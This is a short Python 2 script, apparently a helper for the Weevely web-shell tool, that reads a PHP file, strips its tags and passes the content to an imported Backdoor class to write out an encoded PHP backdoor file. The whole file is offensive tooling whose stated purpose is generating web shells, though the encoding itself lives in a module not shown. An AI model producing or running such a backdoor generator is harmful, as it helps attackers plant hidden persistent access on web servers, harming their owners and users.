#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import re
import sys
from module.backdoor import *


def load_file(filename):
    files = open(filename, 'r')
    content = files.read()
    content = re.sub('^<\?php', '', content)
    content = re.sub('\?>$', '', content)
    return content

def generate_backdoor():
    s = load_file(sys.argv[1])
    backdoor_content = Backdoor(s)
    files = open(sys.argv[2], 'w')
    files.write(backdoor_content.__str__())
    files.close()


if __name__ == "__main__":

    if len(sys.argv) != 3:
        print 'Usage: python weevely-encryption.py input_filename.php output_filename.php'
    else:
        generate_backdoor()

